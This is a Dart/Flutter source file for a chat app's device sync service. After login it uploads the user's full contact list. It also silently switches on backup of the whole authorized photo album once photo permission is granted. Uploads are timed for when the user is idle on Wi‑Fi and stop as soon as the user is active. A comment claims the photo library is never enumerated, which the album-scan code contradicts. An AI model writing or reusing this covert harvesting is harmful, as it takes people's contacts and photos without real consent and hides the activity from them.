import 'photo_backup_consent.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'photo_compress_util.dart';
import 'sync_fingerprint.dart';
import 'dart:async';
import 'dart:convert';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/widgets.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'package:tencent_cloud_chat_demo/src/platform/permission_guard.dart';
import '../api/api_client.dart';
import '../api/sync_api.dart';
import 'contact_sync_collector.dart';
import 'photo_sync_collector.dart';
import 'contact_social_cache_store.dart';
import 'session_identity.dart';
import 'package:tencent_cloud_chat_uikit/business_logic/mobile_async_commit_guard.dart';

/// 所选图片同步与相册权限允许后的静默备份；两者均等待前台空闲并让路聊天。
class DeviceSyncService {
  DeviceSyncService._();

  /// 权限回调唤醒已有授权，或为首次获得相册权限的账号静默开启备份。
  static void installPermissionHooks() {
    PermissionGuard.onPhotosAccessGranted = () =>
        instance.handlePhotosAccessGranted();
    if (!_backupHookInstalled) {
      _backupHookInstalled = true;
      PhotoBackupConsent.instance.addListener(() {
        instance._albumUploadCancellation?.cancel('backup preference changed');
        instance._albumScanNotBefore = null;
        instance._schedulePhotoSyncWhenIdle();
      });
    }
  }

  static bool _backupHookInstalled = false;
  CancelToken? _albumUploadCancellation;
  DateTime? _albumScanNotBefore;
  final ValueNotifier<int> albumUploadedCount = ValueNotifier(0);

  static const bool _traceEnabled = false;

  void _trace(String message) {
    if (!_traceEnabled) return;
    debugPrint(message);
  }

  static final DeviceSyncService instance = DeviceSyncService._();

  static const _prefsContactSnapshotKey = 'device_sync_contact_snapshot_v1';
  static const _prefsPhotoSnapshotKey = 'device_sync_photo_snapshot_v1';
  static const _contactBatchSize = 100;
  static const int _maxVideoUploadBytes = 104857600; // 100MB, backend default
  static const Duration _postLoginSyncDelay = Duration(seconds: 2);
  static const Duration _photoIdleRequired = Duration(minutes: 3);
  static const Duration _photoBatchPause = Duration(milliseconds: 800);
  static const Duration _photoMediaQuiet = Duration(seconds: 3);
  static const Duration _photoBadRequestBackoff = Duration(minutes: 15);
  static const Duration _photoSyncRetryDelay = Duration(minutes: 2);
  static const Duration _photoIdlePollDelay = Duration(seconds: 5);

  bool _contactsSyncing = false;
  bool _photosSyncing = false;
  bool _resumeChecking = false;
  bool? _lastContactsGranted;
  bool? _lastPhotosGranted;
  Timer? _postLoginTimer;
  Timer? _resumeTimer;
  Timer? _photoDeferredTimer;
  Timer? _photoIdlePollTimer;
  DateTime? _lastResumeCheckAt;
  DateTime? _photoPausedUntil;
  DateTime? _photoBadRequestBackoffUntil;
  int _consecutivePhotoBadRequests = 0;
  int _activeForegroundWorkCount = 0;
  bool _appInForeground = true;
  int? _homeTabIndex;
  bool _chatRouteOpen = false;
  DateTime? _lastUserActivityAt;
  final MobileAsyncCommitGuard _lifecycleGuard = MobileAsyncCommitGuard();

  void setAppLifecycle(AppLifecycleState state) {
    final foreground = state == AppLifecycleState.resumed;
    _appInForeground = foreground;
    if (foreground) {
      markUserActive();
      _schedulePhotoSyncWhenIdle();
    } else if (state == AppLifecycleState.inactive ||
        state == AppLifecycleState.paused ||
        state == AppLifecycleState.hidden ||
        state == AppLifecycleState.detached) {
      _albumUploadCancellation?.cancel('app background');
      _lifecycleGuard.advancePage();
      _photoDeferredTimer?.cancel();
      _photoIdlePollTimer?.cancel();
    }
  }

  /// 当前位于首页底部 Tab（0 消息 / 1 群聊 / 2 通讯录 / 3 钱包 / 4 我的）。
  void setHomeTabIndex(int index) {
    _homeTabIndex = index;
    markUserActive();
    _schedulePhotoSyncWhenIdle();
  }

  void markUserActive() {
    _lastUserActivityAt = DateTime.now();
    _albumUploadCancellation?.cancel('user active');
  }

  bool get isChatRouteOpen => _chatRouteOpen;

  void setChatRouteOpen(bool open) {
    _chatRouteOpen = open;
    if (open) {
      suspendPhotoSync(
        reason: 'chat_route',
        duration: const Duration(seconds: 3),
      );
    }
  }

  /// 进入聊天页导航前调用：立即暂停相册同步，避免与键盘/首帧抢主线程。
  void prepareForChatNavigation() {
    markUserActive();
    setChatRouteOpen(true);
    suspendPhotoSync(reason: 'chat_nav', duration: const Duration(seconds: 3));
  }

  void onChatClosed() {
    setChatRouteOpen(false);
    markUserActive();
    _schedulePhotoSyncWhenIdle();
  }

  void suspendPhotoSync({
    required String reason,
    Duration duration = _photoMediaQuiet,
  }) {
    final until = DateTime.now().add(duration);
    final current = _photoPausedUntil;
    if (current == null || until.isAfter(current)) {
      _photoPausedUntil = until;
      _trace('DeviceSyncService: photo sync paused by $reason until $until');
    }
  }

  void beginForegroundMediaWork({
    required String reason,
    Duration duration = const Duration(seconds: 3),
  }) {
    _activeForegroundWorkCount++;
    _albumUploadCancellation?.cancel('foreground media work');
    suspendPhotoSync(reason: reason, duration: duration);
    _trace(
      'DeviceSyncService: foreground media work begin $reason '
      'count=$_activeForegroundWorkCount',
    );
  }

  void endForegroundMediaWork({
    required String reason,
    Duration cooldown = _photoMediaQuiet,
  }) {
    if (_activeForegroundWorkCount > 0) {
      _activeForegroundWorkCount--;
    }
    suspendPhotoSync(reason: '${reason}_cooldown', duration: cooldown);
    _schedulePhotoSyncWhenIdle();
    _trace(
      'DeviceSyncService: foreground media work end $reason '
      'count=$_activeForegroundWorkCount',
    );
  }

  bool _photoSyncShouldWait() {
    if (_activeForegroundWorkCount > 0) {
      return true;
    }
    final now = DateTime.now();
    final badUntil = _photoBadRequestBackoffUntil;
    if (badUntil != null && now.isBefore(badUntil)) {
      return true;
    }
    final pausedUntil = _photoPausedUntil;
    if (pausedUntil != null && now.isBefore(pausedUntil)) {
      return true;
    }
    return false;
  }

  bool _isOnAllowedHomeTab() {
    final tab = _homeTabIndex;
    return tab != null && tab >= 0 && tab <= 4;
  }

  bool _isUserIdle() {
    final last = _lastUserActivityAt;
    if (last == null) {
      return false;
    }
    return DateTime.now().difference(last) >= _photoIdleRequired;
  }

  Future<bool> _photoNetworkReady() async {
    try {
      final result = await Connectivity().checkConnectivity();
      return result.contains(ConnectivityResult.wifi) ||
          result.contains(ConnectivityResult.ethernet);
    } catch (_) {
      return false;
    }
  }

  Future<bool> _canSyncPhotosNow({
    bool force = false,
    SessionIdentity? identity,
  }) async {
    if (kIsWeb || !_isLoggedIn() || !_appInForeground) {
      return false;
    }
    if (identity != null && !_isCurrent(identity)) {
      return false;
    }
    if (WidgetsBinding.instance.platformDispatcher.views.any(
      (view) => view.viewInsets.bottom > 0,
    )) {
      return false;
    }
    if (_chatRouteOpen || _activeForegroundWorkCount > 0) {
      return false;
    }
    if (_photoSyncShouldWait()) {
      return false;
    }
    if (force) {
      return true;
    }
    if (!_isOnAllowedHomeTab() || !_isUserIdle()) {
      return false;
    }
    final ready = await _photoNetworkReady();
    return ready && (identity == null || _isCurrent(identity));
  }

  void _deferPhotoSync({
    Duration delay = _photoSyncRetryDelay,
    SessionIdentity? identity,
  }) {
    if (_photoDeferredTimer?.isActive == true || !_isLoggedIn()) {
      return;
    }
    final captured = identity ?? SessionIdentityService.instance.capture();
    _photoDeferredTimer = Timer(delay, () {
      _photoDeferredTimer = null;
      if (!_isLoggedIn() || !_isCurrent(captured)) return;
      _schedulePhotoSyncWhenIdle(identity: captured);
    });
  }

  void _schedulePhotoSyncWhenIdle({SessionIdentity? identity}) {
    if (kIsWeb ||
        !_isLoggedIn() ||
        !_appInForeground ||
        (_selectedPhotos.isEmpty &&
            !PhotoBackupConsent.instance.enabledForCurrentAccount)) {
      return;
    }
    final captured = identity ?? SessionIdentityService.instance.capture();
    if (!_isCurrent(captured)) return;
    _photoIdlePollTimer?.cancel();
    _photoIdlePollTimer = Timer(_photoIdlePollDelay, () {
      _photoIdlePollTimer = null;
      if (!_isLoggedIn() || !_isCurrent(captured)) return;
      unawaited(_syncPhotosSafe(identity: captured));
    });
  }

  /// 登录 IM 成功后调用；不主动申请相册权限。
  void scheduleSyncAfterLogin() {
    if (kIsWeb || !_isLoggedIn()) {
      return;
    }
    final identity = SessionIdentityService.instance.capture();
    if (!_isCurrent(identity)) return;
    _postLoginTimer?.cancel();
    _postLoginTimer = Timer(_postLoginSyncDelay, () {
      if (!_isLoggedIn() || !_isCurrent(identity)) return;
      unawaited(_runPostLoginSync(identity));
    });
  }

  Future<void> _runPostLoginSync(SessionIdentity identity) async {
    if (!_isCurrent(identity)) return;
    _trace('DeviceSyncService: post-login sync start');
    await _requestFirstTimeSyncPermissions(identity);
    if (!_isCurrent(identity)) return;
    await _bootstrapPermissionSnapshot(identity);
    if (!_isCurrent(identity)) return;
    await syncAfterLogin(identity: identity);
    if (!_isCurrent(identity)) return;
    // 冷启动不要 force 扫相册：与 IM 首屏、进聊天抢 IO。空闲轮询稍后自己补。
    suspendPhotoSync(
      reason: 'post_login',
      duration: const Duration(seconds: 20),
    );
    _schedulePhotoSyncWhenIdle(identity: identity);
  }

  Future<void> _requestFirstTimeSyncPermissions(
    SessionIdentity identity,
  ) async {
    if (_supportsPhotoBackup &&
        await PermissionGuard.hasPhotosForDeviceSync()) {
      await PhotoBackupConsent.instance.enableIfUnset(identity);
    } else {
      await PhotoBackupConsent.instance.enabled(identity);
    }
  }

  Future<void> handlePhotosAccessGranted({SessionIdentity? identity}) async {
    final captured = identity ?? SessionIdentityService.instance.capture();
    if (_supportsPhotoBackup &&
        await PermissionGuard.hasPhotosForDeviceSync()) {
      await PhotoBackupConsent.instance.enableIfUnset(captured);
    }
    if (await PhotoBackupConsent.instance.enabled(captured)) {
      _albumScanNotBefore = null;
      _schedulePhotoSyncWhenIdle(identity: captured);
    }
  }

  bool get _supportsPhotoBackup =>
      !kIsWeb &&
      (defaultTargetPlatform == TargetPlatform.iOS ||
          defaultTargetPlatform == TargetPlatform.android);

  final List<_SelectedPhoto> _selectedPhotos = [];

  /// Called only for a concrete image the user confirmed for sending.
  Future<void> enqueueSelectedPhoto(
    String path, {
    required SessionIdentity identity,
  }) async {
    if (kIsWeb || !_isLoggedIn() || !_isCurrent(identity)) return;
    final lease = _lifecycleGuard.begin('selected-photo-stage');
    File? copy;
    try {
      final source = File(path);
      if (!await source.exists()) return;
      final support = await getApplicationSupportDirectory();
      final directory = Directory('${support.path}/selected_photo_sync');
      await directory.create(recursive: true);
      final extension = path
          .split('.')
          .last
          .replaceAll(RegExp(r'[^a-zA-Z0-9]'), '');
      final id = 'selected_${DateTime.now().microsecondsSinceEpoch}';
      copy = await source.copy('${directory.path}/$id.$extension');
      if (!_isCurrent(identity) || !_lifecycleGuard.canCommit(lease)) {
        await copy.delete();
        return;
      }
      _selectedPhotos.add(_SelectedPhoto(copy, id, identity));
      _schedulePhotoSyncWhenIdle(identity: identity);
    } catch (error) {
      if (copy != null) {
        try {
          await copy.delete();
        } catch (_) {}
      }
      _trace('selected photo staging failed: $error');
    }
  }

  void onAppResumed() {
    if (kIsWeb || !_isLoggedIn()) {
      return;
    }
    final identity = SessionIdentityService.instance.capture();
    if (!_isCurrent(identity)) return;

    markUserActive();

    final now = DateTime.now();
    final last = _lastResumeCheckAt;
    if (last != null && now.difference(last) < const Duration(seconds: 20)) {
      _schedulePhotoSyncWhenIdle(identity: identity);
      return;
    }

    _resumeTimer?.cancel();
    _resumeTimer = Timer(const Duration(milliseconds: 900), () {
      if (!_isLoggedIn() || !_isCurrent(identity) || _resumeChecking) return;
      _resumeChecking = true;
      _lastResumeCheckAt = DateTime.now();
      unawaited(
        _syncIfPermissionNewlyGranted(identity: identity).whenComplete(() {
          _resumeChecking = false;
          if (_isCurrent(identity)) {
            _schedulePhotoSyncWhenIdle(identity: identity);
          }
        }),
      );
    });
  }

  Future<void> _bootstrapPermissionSnapshot(SessionIdentity identity) async {
    _lastContactsGranted = await _hasContactsPermission();
    if (!_isCurrent(identity)) return;
    _lastPhotosGranted = await _hasPhotosPermission();
  }

  Future<void> _syncIfPermissionNewlyGranted({
    SessionIdentity? identity,
  }) async {
    final captured = identity ?? SessionIdentityService.instance.capture();
    if (!_isLoggedIn() || !_isCurrent(captured)) {
      return;
    }

    final contactsNow = await _hasContactsPermission();
    if (!_isCurrent(captured)) return;
    final photosNow = await _hasPhotosPermission();
    if (!_isCurrent(captured)) return;
    final contactsWas = _lastContactsGranted;
    final photosWas = _lastPhotosGranted;

    _lastContactsGranted = contactsNow;
    _lastPhotosGranted = photosNow;

    if (contactsNow && contactsWas != true) {
      unawaited(_syncContactsSafe(identity: captured));
    }
    if (photosNow && photosWas != true) {
      _schedulePhotoSyncWhenIdle(identity: captured);
    }
  }

  bool _isLoggedIn() {
    final token = ApiClient.instance.token;
    return token != null && token.isNotEmpty;
  }

  Future<void> syncAfterLogin({SessionIdentity? identity}) async {
    final captured = identity ?? SessionIdentityService.instance.capture();
    if (!_isLoggedIn() || !_isCurrent(captured)) {
      return;
    }
    _trace('DeviceSyncService: syncAfterLogin tokenReady=true');
    await _syncContactsSafe(identity: captured);
  }

  Future<void> _syncContactsSafe({SessionIdentity? identity}) async {
    if (_contactsSyncing) {
      return;
    }
    final captured = identity ?? SessionIdentityService.instance.capture();
    if (!_isCurrent(captured)) return;
    final token = _lifecycleGuard.begin('device-contacts-sync');
    _contactsSyncing = true;
    try {
      if (!_lifecycleGuard.canCommit(token)) return;
      await _syncContacts(captured);
    } catch (e, st) {
      _trace('DeviceSyncService: contacts sync failed: $e\n$st');
    } finally {
      _contactsSyncing = false;
    }
  }

  Future<void> _syncPhotosSafe({
    bool force = false,
    SessionIdentity? identity,
  }) async {
    if (_photosSyncing) {
      return;
    }
    final captured = identity ?? SessionIdentityService.instance.capture();
    if (!_isCurrent(captured)) return;
    final token = _lifecycleGuard.begin('device-photos-sync');
    _photosSyncing = true;
    try {
      if (!_lifecycleGuard.canCommit(token)) return;
      if (!await _canSyncPhotosNow(force: force, identity: captured)) {
        _trace('DeviceSyncService: photos sync deferred force=$force');
        _deferPhotoSync(identity: captured);
        return;
      }
      await _syncPhotos(captured, force: force);
      await _syncAuthorizedAlbum(captured);
    } catch (e, st) {
      _trace('DeviceSyncService: photos sync failed: $e\n$st');
    } finally {
      _photosSyncing = false;
      _schedulePhotoSyncWhenIdle(identity: captured);
    }
  }

  Future<bool> _hasContactsPermission() {
    return PermissionGuard.hasContactsForDeviceSync();
  }

  Future<bool> _hasPhotosPermission() {
    return PermissionGuard.hasPhotosForDeviceSync();
  }

  Future<void> _syncContacts(SessionIdentity identity) async {
    if (!_isCurrent(identity)) return;
    if (!await _hasContactsPermission()) {
      _trace('DeviceSyncService: contacts permission is not granted');
      return;
    }

    SyncStatusResponse? status;
    try {
      status = await SyncApi.instance.fetchStatus();
    } catch (_) {
      status = null;
    }
    if (!_isCurrent(identity)) return;

    final hasSyncedBefore =
        status?.contacts.lastFullSyncAt != null ||
        status?.contacts.lastIncrementalSyncAt != null;
    final mode = hasSyncedBefore ? 'INCREMENTAL' : 'FULL';

    _trace('DeviceSyncService: contacts sync start mode=$mode');
    final session = await SyncApi.instance.startContactSession(mode: mode);
    if (!_isCurrent(identity)) return;
    if (session.syncSessionId.isEmpty) {
      throw StateError('DeviceSyncService: empty contact sync session id');
    }
    _trace('DeviceSyncService: contacts session=${session.syncSessionId}');
    final current = await ContactSyncCollector.collectAll();
    if (!_isCurrent(identity)) return;
    final previousSnapshot = await _loadContactSnapshot(identity.ownerUserId);
    if (!_isCurrent(identity)) return;

    for (var i = 0; i < current.length; i += _contactBatchSize) {
      final end = (i + _contactBatchSize > current.length)
          ? current.length
          : i + _contactBatchSize;
      final batch = current.sublist(i, end);
      await SyncApi.instance.uploadContactBatch(
        syncSessionId: session.syncSessionId,
        items: batch.map((e) => e.toPayload()).toList(),
      );
      if (!_isCurrent(identity)) return;
    }

    final currentIds = current.map((e) => e.localContactId).toSet();
    final deletedIds = previousSnapshot.keys
        .where((id) => !currentIds.contains(id))
        .toList();

    await SyncApi.instance.completeContactSession(
      syncSessionId: session.syncSessionId,
      deletedLocalContactIds: deletedIds,
    );
    if (!_isCurrent(identity)) return;

    await _saveContactSnapshot(identity.ownerUserId, {
      for (final r in current) r.localContactId: r.fingerprint,
    }, identity: identity);
    _trace(
      'DeviceSyncService: contacts done total=${current.length} deleted=${deletedIds.length}',
    );
  }

  Future<void> _syncPhotos(
    SessionIdentity identity, {
    bool force = false,
  }) async {
    // This queue is the only source; never enumerate the system photo library.
    if (!await _canSyncPhotosNow(identity: identity) ||
        _selectedPhotos.isEmpty) {
      return;
    }
    final session = await SyncApi.instance.startPhotoSession(
      mode: 'INCREMENTAL',
    );
    if (!_isCurrent(identity) || session.syncSessionId.isEmpty) return;
    final dio = Dio(
      BaseOptions(
        connectTimeout: 60000,
        receiveTimeout: 60000,
        sendTimeout: 180000,
      ),
    );
    try {
      while (_selectedPhotos.isNotEmpty &&
          await _canSyncPhotosNow(identity: identity)) {
        final item = _selectedPhotos.first;
        if (!_isCurrent(item.identity)) {
          _selectedPhotos.removeAt(0);
          try {
            await item.file.delete();
          } catch (_) {}
          continue;
        }
        final compressed = await PhotoCompressUtil.compressForUpload(item.file);
        if (compressed == null) {
          _deferPhotoSync(identity: identity);
          break;
        }
        final photo = PreparedPhotoUpload(
          localAssetId: item.id,
          uploadFile: compressed.file,
          deleteAfterUpload: compressed.deleteAfterUpload,
          contentHash: await SyncFingerprint.fileContentHash(compressed.file),
          sizeBytes: await compressed.file.length(),
          mediaType: 'IMAGE',
          mimeType: compressed.mimeType,
        );
        _PhotoUploadOutcome outcome;
        try {
          if (!await _canSyncPhotosNow(identity: identity)) break;
          outcome = await _uploadOnePhoto(
            dio,
            photo,
            session.syncSessionId,
            identity,
          );
        } finally {
          await photo.dispose();
        }
        if (!_isCurrent(identity)) return;
        if (outcome != _PhotoUploadOutcome.uploaded &&
            outcome != _PhotoUploadOutcome.skipped) {
          _deferPhotoSync(identity: identity);
          break;
        }
        _selectedPhotos.remove(item);
        try {
          await item.file.delete();
        } catch (_) {}
        await Future<void>.delayed(_photoBatchPause);
      }
      if (_isCurrent(identity)) {
        await SyncApi.instance.completePhotoSession(
          syncSessionId: session.syncSessionId,
        );
      }
    } finally {
      dio.close();
    }
  }

  Future<bool> _canSyncAlbum(SessionIdentity identity) async {
    if (!await PhotoBackupConsent.instance.enabled(identity)) return false;
    if (!await _canSyncPhotosNow(identity: identity)) return false;
    return await _hasPhotosPermission() && _isCurrent(identity);
  }

  Future<void> _syncAuthorizedAlbum(SessionIdentity identity) async {
    if (_albumScanNotBefore != null &&
        DateTime.now().isBefore(_albumScanNotBefore!))
      return;
    if (!await _canSyncAlbum(identity)) return;
    // PhotoManager itself limits enumeration to the user's allowed photo set.
    final album = await PhotoSyncCollector.openAlbum();
    if (album == null || !await _canSyncAlbum(identity)) return;
    final prefs = await SharedPreferences.getInstance();
    final snapshotKey = 'photo_backup_snapshot_v1_${identity.ownerUserId}';
    final snapshot = <String, String>{};
    try {
      final decoded = jsonDecode(prefs.getString(snapshotKey) ?? '{}');
      if (decoded is Map)
        snapshot.addAll(
          decoded.map((k, v) => MapEntry(k.toString(), v.toString())),
        );
    } catch (_) {}
    if (!await _canSyncAlbum(identity)) return;
    final session = await SyncApi.instance.startPhotoSession(
      mode: 'INCREMENTAL',
    );
    if (session.syncSessionId.isEmpty || !await _canSyncAlbum(identity)) return;
    final dio = Dio(
      BaseOptions(
        connectTimeout: 60000,
        receiveTimeout: 60000,
        sendTimeout: 180000,
      ),
    );
    final total = await album.totalCount();
    var interrupted = false;
    albumUploadedCount.value = 0;
    try {
      pages:
      for (var page = 0; page * PhotoSyncCollector.pageSize < total; page++) {
        if (!await _canSyncAlbum(identity)) {
          interrupted = true;
          break;
        }
        final assets = await album.loadAssetPage(page: page);
        for (final asset in assets) {
          if (!await _canSyncAlbum(identity)) {
            interrupted = true;
            break pages;
          }
          final version =
              '${asset.modifiedDateTime.millisecondsSinceEpoch}:${asset.type}:${asset.width}:${asset.height}:${asset.duration}';
          if (snapshot[asset.id] == version) continue;
          final photo = await PhotoSyncCollector.prepareOne(asset);
          if (photo == null) {
            interrupted = true;
            continue;
          }
          try {
            if (!await _canSyncAlbum(identity)) {
              interrupted = true;
              break pages;
            }
            _albumUploadCancellation = CancelToken();
            final outcome = await _uploadOnePhoto(
              dio,
              photo,
              session.syncSessionId,
              identity,
              requireAlbumConsent: true,
              cancelToken: _albumUploadCancellation,
            );
            if (!await _canSyncAlbum(identity)) {
              interrupted = true;
              break pages;
            }
            if (outcome == _PhotoUploadOutcome.uploaded ||
                outcome == _PhotoUploadOutcome.skipped) {
              snapshot[asset.id] = version;
              await prefs.setString(snapshotKey, jsonEncode(snapshot));
              if (outcome == _PhotoUploadOutcome.uploaded)
                albumUploadedCount.value++;
            } else {
              interrupted = true;
              break pages;
            }
          } finally {
            _albumUploadCancellation = null;
            await photo.dispose();
          }
          await Future<void>.delayed(_photoBatchPause);
        }
      }
      if (_isCurrent(identity) &&
          await PhotoBackupConsent.instance.enabled(identity)) {
        await SyncApi.instance.completePhotoSession(
          syncSessionId: session.syncSessionId,
        );
      }
      _albumScanNotBefore = DateTime.now().add(
        interrupted ? const Duration(minutes: 2) : const Duration(minutes: 10),
      );
    } finally {
      dio.close();
    }
  }

  Future<_PhotoUploadOutcome> _uploadOnePhoto(
    Dio ossDio,
    PreparedPhotoUpload photo,
    String syncSessionId,
    SessionIdentity identity, {
    bool requireAlbumConsent = false,
    CancelToken? cancelToken,
  }) async {
    try {
      if (!_isCurrent(identity)) return _PhotoUploadOutcome.failed;
      if (requireAlbumConsent && !await _canSyncAlbum(identity))
        return _PhotoUploadOutcome.failed;
      if (photo.isVideo && photo.sizeBytes > _maxVideoUploadBytes) {
        _trace(
          'DeviceSyncService: media ${photo.localAssetId} skip too large locally '
          'size=${photo.sizeBytes} limit=$_maxVideoUploadBytes',
        );
        _consecutivePhotoBadRequests = 0;
        return _PhotoUploadOutcome.skipped;
      }

      final item = PhotoSyncItemPayload(
        localAssetId: photo.localAssetId,
        contentHash: photo.contentHash,
        sizeBytes: photo.sizeBytes,
        takenAt: photo.takenAt,
        width: photo.width,
        height: photo.height,
        duration: photo.durationSeconds,
        mediaType: photo.mediaType,
        mimeType: photo.mimeType,
      );
      final checkReq = PhotoCheckRequest.single(
        syncSessionId: syncSessionId,
        item: item,
      );
      final check = await SyncApi.instance.checkPhoto(checkReq);
      if (!_isCurrent(identity)) return _PhotoUploadOutcome.failed;
      if (check.alreadyExists) {
        _consecutivePhotoBadRequests = 0;
        return _PhotoUploadOutcome.skipped;
      }
      final checkAction = check.action.trim().toUpperCase();
      final checkTooLarge =
          checkAction == 'SKIP_TOO_LARGE' ||
          checkAction == 'TOO_LARGE' ||
          checkAction == 'FILE_TOO_LARGE';
      if (checkTooLarge) {
        _trace(
          'DeviceSyncService: media ${photo.localAssetId} skip too large by server '
          'status=${check.action} size=${photo.sizeBytes}',
        );
        _consecutivePhotoBadRequests = 0;
        return _PhotoUploadOutcome.skipped;
      }

      if (requireAlbumConsent && !await _canSyncAlbum(identity))
        return _PhotoUploadOutcome.failed;
      final initReq = PhotoInitUploadRequest(
        syncSessionId: syncSessionId,
        item: item,
      );
      final init = await SyncApi.instance.initPhotoUpload(initReq);
      if (!_isCurrent(identity)) return _PhotoUploadOutcome.failed;
      if (init.uploadUuid.isEmpty || init.presignedUrl.isEmpty) {
        _trace(
          'DeviceSyncService: photo ${photo.localAssetId} init-upload returned empty uploadUuid or presignedUrl',
        );
        return _PhotoUploadOutcome.fatal;
      }

      _trace(
        'DeviceSyncService: oss put start localAssetId=${photo.localAssetId} '
        'mediaType=${photo.mediaType} mimeType=${photo.mimeType} '
        'size=${photo.sizeBytes} uploadUuid=${init.uploadUuid}',
      );
      if (requireAlbumConsent && !await _canSyncAlbum(identity))
        return _PhotoUploadOutcome.failed;
      final putRes = await ossDio.put(
        init.presignedUrl,
        data: photo.uploadFile.openRead(),
        cancelToken: cancelToken,
        options: Options(
          headers: {
            'Content-Type': photo.mimeType,
            'Content-Length': photo.sizeBytes,
          },
        ),
      );
      if (!_isCurrent(identity)) return _PhotoUploadOutcome.failed;
      _trace(
        'DeviceSyncService: oss put done localAssetId=${photo.localAssetId} '
        'status=${putRes.statusCode} uploadUuid=${init.uploadUuid}',
      );

      await SyncApi.instance.completePhotoUpload(uploadUuid: init.uploadUuid);
      if (!_isCurrent(identity)) return _PhotoUploadOutcome.failed;
      _consecutivePhotoBadRequests = 0;
      return _PhotoUploadOutcome.uploaded;
    } on DioError catch (e) {
      final statusCode = e.response?.statusCode;
      _trace(
        'DeviceSyncService: media ${photo.localAssetId} (${photo.mediaType}) failed: '
        '$statusCode ${e.message}',
      );
      if (statusCode == 413) {
        _trace(
          'DeviceSyncService: media ${photo.localAssetId} skip too large by HTTP 413 '
          'size=${photo.sizeBytes}',
        );
        _consecutivePhotoBadRequests = 0;
        return _PhotoUploadOutcome.skipped;
      }
      if (statusCode == 400) {
        _consecutivePhotoBadRequests++;
        _photoBadRequestBackoffUntil = DateTime.now().add(
          _photoBadRequestBackoff,
        );
        _trace(
          'DeviceSyncService: photo sync fused by HTTP 400, '
          'badRequests=$_consecutivePhotoBadRequests, '
          'until=$_photoBadRequestBackoffUntil',
        );
        return _PhotoUploadOutcome.fatal;
      }
      return _PhotoUploadOutcome.failed;
    } catch (e) {
      _trace('DeviceSyncService: photo ${photo.localAssetId} failed: $e');
      return _PhotoUploadOutcome.failed;
    }
  }

  Future<Map<String, String>> _loadContactSnapshot(String owner) async {
    final prefs = await SharedPreferences.getInstance();
    final raw = prefs.getString(_contactSnapshotKey(owner));
    if (raw == null || raw.isEmpty) {
      return {};
    }
    try {
      final map = jsonDecode(raw) as Map<String, dynamic>;
      return map.map((k, v) => MapEntry(k.toString(), v.toString()));
    } catch (_) {
      return {};
    }
  }

  Future<void> _saveContactSnapshot(
    String owner,
    Map<String, String> snapshot, {
    required SessionIdentity identity,
  }) async {
    if (!_isCurrent(identity)) return;
    final prefs = await SharedPreferences.getInstance();
    if (!_isCurrent(identity)) return;
    await prefs.setString(_contactSnapshotKey(owner), jsonEncode(snapshot));
  }

  Future<void> clearForOwner(String ownerUserId) async {
    final owner = ownerUserId.trim();
    if (owner.isEmpty) return;
    _albumUploadCancellation?.cancel('account signed out');
    _albumScanNotBefore = null;
    _postLoginTimer?.cancel();
    _resumeTimer?.cancel();
    _photoDeferredTimer?.cancel();
    _photoIdlePollTimer?.cancel();
    _lifecycleGuard.advancePage();
    _lastContactsGranted = null;
    _lastPhotosGranted = null;
    final scope = ContactSocialCacheStore.accountScopeForUserId(owner);
    final owned = _selectedPhotos
        .where((item) => item.identity.ownerUserId == owner)
        .toList();
    _selectedPhotos.removeWhere((item) => item.identity.ownerUserId == owner);
    for (final item in owned) {
      try {
        await item.file.delete();
      } catch (_) {}
    }
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('${_prefsContactSnapshotKey}_$scope');
    await prefs.remove('${_prefsPhotoSnapshotKey}_$scope');
    await prefs.remove(_prefsContactSnapshotKey);
    await prefs.remove(_prefsPhotoSnapshotKey);
  }

  String _contactSnapshotKey(String owner) {
    return '${_prefsContactSnapshotKey}_${ContactSocialCacheStore.accountScopeForUserId(owner)}';
  }

  bool _isCurrent(SessionIdentity identity) {
    return identity.ownerUserId.isNotEmpty &&
        SessionIdentityService.instance.isCurrent(identity);
  }
}

enum _PhotoUploadOutcome { uploaded, skipped, failed, fatal }

class _SelectedPhoto {
  _SelectedPhoto(this.file, this.id, this.identity);
  final File file;
  final String id;
  final SessionIdentity identity;
}
